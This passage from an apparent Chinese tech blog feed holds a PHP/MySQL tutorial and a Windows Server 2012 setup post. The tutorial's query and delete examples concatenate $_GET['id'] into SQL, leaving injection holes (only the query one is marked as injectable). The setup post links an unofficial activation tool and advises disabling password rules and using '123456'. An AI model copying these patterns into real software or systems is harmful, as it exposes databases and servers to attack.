invoke__">run</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> \mydemo\b<span class="title class_">\Dog</span>::<span class="title function_ invoke__">run</span>();</span><br></pre></td></tr></table></figure><p>3.引入多个元素</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use 空间名\&#123;</span><br><span class="line">类名，</span><br><span class="line">function 函数名，</span><br><span class="line">const 常量</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p> 4.引入空间</p><ul><li>use 空间名</li></ul><p>获取当前命名空间的名字使用<code>__NAMESPACE__</code> 关键字。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">two</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getName</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">__NAMESPACE__</span>.<span class="string">&quot;--getName&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">getName</span>();</span><br></pre></td></tr></table></figure><h1 id="15-正则表达式"><a href="#15-正则表达式" class="headerlink" title="15 正则表达式"></a>15 正则表达式</h1><p><strong>正则表达式简介</strong></p><p>正则表达式是用于描述字符排列和匹配模式的一种语法规则。它主要用于字符串的模式分割、匹配、查找及替换操作。到目前为止，我们前面所用过的精确（文本）匹配也是一种正则表达式。</p><p>在PHP中，正则表达式一般是由正规字符和一些特殊字符（类似于通配符）联合构成的一个文本模式的程序性描述。</p><p>正则表达式较重要和较有用的角色是验证用户数据的有效性检查。</p><p>PHP中，正则表达式有三个作用：</p><ul><li>匹配，也常常用于从字符串中析取信息。</li><li>用新文本代替匹配文本。</li><li>将一个字符串拆分为一组更小的信息块。</li></ul><p><strong>正则表达式的基本语法</strong></p><p>PCRE库函数中，正则匹配模式使用分隔符与元字符组成，分隔符可以是非数字、非反斜线、非空格的任意字符。经常使用的分隔符是正斜线 <code>/</code> 、hash符号 <code>#</code> 以及取反符号 <code>~</code> 。</p><p>元字符是用于构造规则表达式的具有特殊含义的字符。如果要在正则表达式中包含元字符本身，必须在其前加上 <code>\</code> 进行转义。</p><table><thead><tr><th align="center">元字符</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">*</td><td align="center">0次、1次或多次匹配其前的原子</td></tr><tr><td align="center">+</td><td align="center">1次或多次匹配其前的原子</td></tr><tr><td align="center">?</td><td align="center">0次或1次匹配其前的原子</td></tr><tr><td align="center">|</td><td align="center">匹配两个或多个选择</td></tr><tr><td align="center">^</td><td align="center">匹配字符串串首的原子</td></tr><tr><td align="center">$</td><td align="center">匹配字符串串尾的原子</td></tr><tr><td align="center">[]</td><td align="center">匹配方括号中的任一原子</td></tr><tr><td align="center">[^]</td><td align="center">匹配除方括号中的原子外的任何字符</td></tr><tr><td align="center">{m}</td><td align="center">表示其前原子恰好出现m次</td></tr><tr><td align="center">{m,n}</td><td align="center">表示其前原子至少出现m次，至少出现n次(n&gt;m)</td></tr><tr><td align="center">{m,}</td><td align="center">表示其前原子出现不少于m次</td></tr><tr><td align="center">()</td><td align="center">整体表示一个原子</td></tr><tr><td align="center">.</td><td align="center">匹配除换行之外的任何一个字符</td></tr></tbody></table><p><strong>边界限制</strong></p><p>在某些情况下，需要对匹配范围进行限定，以获得更准确的匹配结果。“^”和“$”分别指定字符串的开始和结束。</p><p>例如，在字符串“Tom and Jerry chased each other in the house until tom’s uncel come in”中</p><p>元字符“^” 置于字符串的开始确保模式匹配出现在字符串首端；</p><p>^Tom   </p><p>元字符“$” 置于字符串的结束，确保模式匹配出现字符串尾端。</p><p>in$ </p><p>如果不加边界限制元字符，将获得更多的匹配结果。</p><p>^Tom$精确匹配     Tom模糊匹配</p><p><strong>重复匹配</strong></p><p>正则表达式中有一些用于重复匹配某些原子的元字符：“?”、“*”、“+”。他们主要的不同是重复匹配的次数不同。</p><p>元字符“?”:表示0次或1次匹配紧接在其前的原子。</p><p>例如：colou?r匹配“colour”或“color”。</p><p>元字符“*”:表示0次、1次或多次匹配紧接在其前的原子。</p><p>例如：zo*可以匹配z、zoo</p><p>&lt;[A-Za-z][A-Za-z0-9]*&gt;可以匹配“<P>”、“<hl>”或“<Body>”等HTML标签，并且不严格的控制大小写。</p><p>元字符“+”:表示1次或多次匹配紧接在其前的原子。</p><p>例如：go+gle匹配“gogle”、“google”或“gooogle”等中间含有多个o的字符串。</p><p>例子十六进制数字，匹配表达式是0?[ xX][0-9a-fA-F]+,可以匹配“0x9B3C”或者“X800”等。</p><p>元字符 “.”</p><p>元字符“.”匹配除换行符外任何一个字符，相当于<a href="Unix%E7%B3%BB%E7%BB%9F">^\n</a>或<a href="windows%E7%B3%BB%E7%BB%9F">^\r\n</a>。</p><p>例如：pr.y可以匹配的字符串“prey”、“pray”或“pr%y”等。</p><p>通常可以使用“.*”组合来匹配除换行符外的任何字符。在一些书籍中也称其为“全匹配符” 或 “单含匹配符”。</p><p>例如：</p><p>^a.*z$表示可以匹配字母“a”开头，字母“z”结束的任意不包括换行符的字符串。</p><p>.+也可以完成类似的匹配功能所不同的是其至少匹配一个字符。</p><p>^a.+z$将不匹配字符串“az”。</p><p><strong>元字符“{}”</strong>准确地指定原子重复的次数，指定所匹配的原子出现的次数。</p><p>“{m}”表示其前原子恰好出现m次；</p><p>“{m，n}”表示其前原子至少出现m次，至多出现n次；</p><p>“{m，}”表示其前原子出现不少于m次。</p><p>例如：</p><p>zo{1,3}m只能匹配字符串“zom”、“zoom”、或“zooom”。</p><p>zo{3}m只能匹配字符串“zooom”</p><p>zo{3，}m可以匹配以 “z” 开头，“m”结束，中间至少为3个“o”的字符串。</p><p>bo{0,1}u可以匹配字符串“bought a butter” 中的“bou”和“bu”,等价于bo?u。</p><p><strong>原子表 －方括号表达式</strong></p><p>原子表”[]”中存放一组原子，彼此地位平等，且仅匹配其中的一个原子。如果想匹配一个 ”a” 或 ”e” 使用 [ae]。</p><p>例如: Pr[ae]y 匹配 ”Pray” 或者 ”Prey ”。</p><p>原子表 ”[^]” 或者称为排除原子表，匹配除表内原子外的任意一个字符。</p><p>例如：p[^u]匹配“part”中的“pa”，但无法匹配“computer”中的“pu”因为“u”在匹配中被排除。</p><p>原子表“[-]”用于连接一组按ASCII码顺序排列的原子，简化书写。 </p><p>例如：x[0123456789]可以写成x[0-9],用来匹配一个由 “x” 字母与一个数字组成的字符串。</p><p>例如：</p><p>[a-zA-Z]匹配所有大小写字母</p><p>^[a-z][0-9]$匹配比如“z2”、 “t6” 、“g7”</p><p>0[xX][0-9a-fA-F]匹配一个简单的十六进制数字，如“0x9”。</p><p>[^0-9a-zA-Z_]匹配除英文字母、数字和下划线以外任何一个字符，其等价于\W。 </p><p><strong>模式选择符</strong> </p><p>元字符“|”又称模式选择符。在正则表达式中匹配两个或更多的选择之一。</p><p>例如：在字符串“There are many apples and pears.”中，apple|pear在第一次运行时匹配“apple”；再次运行时匹配“ pear”。也可以继续增加选项，如：    apple|pear|banana|lemon</p><p>POSIX风格预定义的正则表达式的字符类：</p><p>   [[:alnum:]]    字母和数字字符</p><p>   [[:alpha:]]      大小写字母</p><p>   [[:lower:]]      小写字母</p><p>   [[:upper:]]      大写字母</p><p>   [[:digit:]]       数字0-9</p><p>   [[:xdigit:]]      十六进制数字</p><p>   [[:punct:]]      标点符号，包括上档键!@</p><p>   [[:blank:]]      TAB制表符和空格</p><p>   [[:space:]]      任何空白字符,换行,回车符</p><p>   [[:cntrl:]]       控制字符（TAB，退格）</p><p><strong>模式单元</strong> </p><p>元字符“（）”将其中的正则表达式变为原子（或称模式单元）使用。与数学表达式中的括号类似，“（）”可以做一个单元被单独使用。</p><p>例如：</p><p>(Dog)+匹配的“Dog”、“DogDog”、“DogDogDog”……..,因为紧接着“+”前的原子是元字符“（）”括起来的字符串“Dog”。</p><p>You (very)+ old匹配“You very old”、 “You very very old”</p><p>Hello (world|earth)匹配“Hello world”、“Hello earth”</p><p>一个模式单元中的表达式将被优先匹配或运算</p><h1 id="16-PHP与Mysql"><a href="#16-PHP与Mysql" class="headerlink" title="16 PHP与Mysql"></a>16 PHP与Mysql</h1><p>PHP 5 及以上版本建议使用以下方式连接 MySQL :</p><ul><li>MySQLi extension (“i” 意为 improved)</li><li>PDO (PHP Data Objects)</li></ul><p> PDO 应用在 12 种不同数据库中， MySQLi 只针对 MySQL 数据库。</p><p>两者都是面向对象, 但 MySQLi 还提供了 API 接口。</p><p>两者都支持预处理语句。 预处理语句可以防止 SQL 注入，对于 web 项目的安全性是非常重要的。</p><p>实例：</p><p>Mysqli连接，面向对象</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建连接</span></span><br><span class="line"><span class="variable">$conn</span>=<span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$servername</span>,<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//检测连接</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$conn</span>-&gt;connect_error)&#123;</span><br><span class="line">    <span class="comment">//如果连接失败，输出错误信息</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;mysqli_error&quot;</span>.<span class="variable">$conn</span>-&gt;connect_error;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//如果连接成功，输出成功信息</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;mysqli_connect successful&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建数据库</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;CREATE DATABASE mydb&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>) === <span class="literal">TRUE</span>)&#123;</span><br><span class="line">    <span class="comment">//query()执行变量$sql中的SQL语句，结果为true输出成功信息</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Database create successfully&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Error creating database: &quot;</span>.<span class="variable">$conn</span>-&gt;error;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>(); <span class="comment">//关闭连接</span></span><br></pre></td></tr></table></figure><p>Mysqli连接，面向过程</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建连接</span></span><br><span class="line"><span class="variable">$conn</span>=<span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>,<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//检测连接</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$conn</span>-&gt;connect_error)&#123;</span><br><span class="line">    <span class="comment">//如果连接失败，输出错误信息</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;mysqli_error&quot;</span>.<span class="variable">$conn</span>-&gt;connect_error;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//如果连接成功，输出成功信息</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;mysqli_connect successful&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>); <span class="comment">//关闭连接</span></span><br></pre></td></tr></table></figure><p>PDO连接</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建连接</span></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="variable">$conn</span>=<span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&quot;mysql:host=<span class="subst">$servername</span>;dbname=myDB&quot;</span>,<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Connected successfuly&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">catch</span>(PDOException <span class="variable">$e</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$conn</span> = <span class="literal">null</span>; <span class="comment">//关闭连接</span></span><br></pre></td></tr></table></figure><p><strong>创建表</strong> </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;mydb&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//连接数据库</span></span><br><span class="line"><span class="variable">$conn</span>=<span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$servername</span>,<span class="variable">$username</span>,<span class="variable">$password</span>,<span class="variable">$dbname</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$conn</span>-&gt;connect_error)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;mysqli_error&quot;</span>.<span class="variable">$conn</span>-&gt;connect_error;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;mysqli_connect successful&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建表</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;CREATE TABLE user(</span></span><br><span class="line"><span class="string">    id INT(6) UNSIGNDE AUTO_INCREMENT PRIMARY KEY,</span></span><br><span class="line"><span class="string">    username VARCHAR(30) NOT NULL,</span></span><br><span class="line"><span class="string">    password VARCHAR(30) NOT NULL,</span></span><br><span class="line"><span class="string">    email VARCHAR(50)</span></span><br><span class="line"><span class="string">);&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>) === <span class="literal">TRUE</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;table create successfully&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Error creating table: &quot;</span>.<span class="variable">$conn</span>-&gt;error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>向表中插入数据</strong> </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;mydb&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//连接数据库</span></span><br><span class="line"><span class="variable">$conn</span>=<span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$servername</span>,<span class="variable">$username</span>,<span class="variable">$password</span>,<span class="variable">$dbname</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$conn</span>-&gt;connect_error)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;mysqli_error&quot;</span>.<span class="variable">$conn</span>-&gt;connect_error;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;mysqli_connect successful&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//向表插入内容</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO user (username,password,email) VALUES (&#x27;Qeminco&#x27;,&#x27;123456&#x27;,&#x27;123456@qq.com&#x27;)&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>) === <span class="literal">TRUE</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Insert successfully!&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Error creating insert: &quot;</span>.<span class="variable">$conn</span>-&gt;error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>查询数据</strong> </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;mydb&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//连接数据库</span></span><br><span class="line"><span class="variable">$conn</span>=<span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$servername</span>,<span class="variable">$username</span>,<span class="variable">$password</span>,<span class="variable">$dbname</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$conn</span>-&gt;connect_error)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;mysqli_error&quot;</span>.<span class="variable">$conn</span>-&gt;connect_error;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;mysqli_connect successful&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//查询数据</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from user&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>())&#123; <span class="comment">//fetch_assoc()函数从结果集里取得一行作为关联数组</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&quot;id&quot;</span>].<span class="variable">$row</span>[<span class="string">&quot;username&quot;</span>].<span class="variable">$row</span>[<span class="string">&quot;password&quot;</span>].<span class="variable">$row</span>[<span class="string">&quot;email&quot;</span>].<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>另一种查询</strong> </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;mydb&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//连接数据库</span></span><br><span class="line"><span class="variable">$conn</span>=<span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$servername</span>,<span class="variable">$username</span>,<span class="variable">$password</span>,<span class="variable">$dbname</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$conn</span>-&gt;connect_error)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;mysqli_error&quot;</span>.<span class="variable">$conn</span>-&gt;connect_error;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;mysqli_connect successful&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//查询数据</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from user where id=&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>())&#123; <span class="comment">//fetch_assoc()函数从结果集里取得一行作为关联数组</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&quot;id&quot;</span>].<span class="variable">$row</span>[<span class="string">&quot;username&quot;</span>].<span class="variable">$row</span>[<span class="string">&quot;password&quot;</span>].<span class="variable">$row</span>[<span class="string">&quot;email&quot;</span>].<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时需要在网址栏添加 <code>?id=</code> ,填1就会出现id为1的数据。</p><p><img src="/img/202206070712183.png"></p><p>存在注入</p><p><img src="/img/202206070714963.png"></p><p><strong>删除数据</strong> </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;mydb&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//连接数据库</span></span><br><span class="line"><span class="variable">$conn</span>=<span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$servername</span>,<span class="variable">$username</span>,<span class="variable">$password</span>,<span class="variable">$dbname</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$conn</span>-&gt;connect_error)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;mysqli_error&quot;</span>.<span class="variable">$conn</span>-&gt;connect_error;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;mysqli_connect successful&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//删除数据</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;DELETE FROM user where id=&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>) === <span class="literal">true</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;删除成功！&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;删除失败！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>更新数据</strong> </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;mydb&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//连接数据库</span></span><br><span class="line"><span class="variable">$conn</span>=<span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$servername</span>,<span class="variable">$username</span>,<span class="variable">$password</span>,<span class="variable">$dbname</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$conn</span>-&gt;connect_error)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;mysqli_error&quot;</span>.<span class="variable">$conn</span>-&gt;connect_error;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;mysqli_connect successful&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//删除数据</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update user set username=&#x27;zhangsan&#x27; where id=1&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>) === <span class="literal">true</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;update successfully!&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Error update: &quot;</span>.<span class="variable">$conn</span>-&gt;error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows Server 2012安装与配置</title>
      <link href="/2022/05/28/Windows%20Server%202012%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/"/>
      <url>/2022/05/28/Windows%20Server%202012%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows-Server-2012安装与配置"><a href="#Windows-Server-2012安装与配置" class="headerlink" title="Windows Server 2012安装与配置"></a>Windows Server 2012安装与配置</h1><h1 id="1-镜像下载"><a href="#1-镜像下载" class="headerlink" title="1 镜像下载"></a>1 镜像下载</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ed2k://|file|cn_windows_server_2012_r2_vl_with_update_x64_dvd_6052729.iso|5545527296|BD499EBCABF406AB82293DD8A5803493|/</span><br></pre></td></tr></table></figure><h1 id="2-激活系统"><a href="#2-激活系统" class="headerlink" title="2 激活系统"></a>2 激活系统</h1><p>激活工具。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">链接：https://pan.baidu.com/s/1GU6wZx4Axv0rhFZVP1JECA?pwd=7kms </span><br><span class="line">提取码：7kms </span><br></pre></td></tr></table></figure><h1 id="3-关闭密码要求"><a href="#3-关闭密码要求" class="headerlink" title="3 关闭密码要求"></a>3 关闭密码要求</h1><p><img src="/img/20220610134151.png"></p><p><img src="/img/20220610134258.png"></p><p>双击打开选择禁用就行了。</p><p>密码最长使用期限改为0就永远不过期了。</p><p><img src="/img/20220610134534.png"></p><h1 id="4-更改密码"><a href="#4-更改密码" class="headerlink" title="4 更改密码"></a>4 更改密码</h1><p><img src="/img/20220610135135.png"></p><p>我把密码改为123456比较好记。</p><p>然后注销重新登录。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS</title>
      <link href="/2022/05/28/xss%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022/05/28/xss%E6%BC%8F%E6%B4%9E/</url>
      
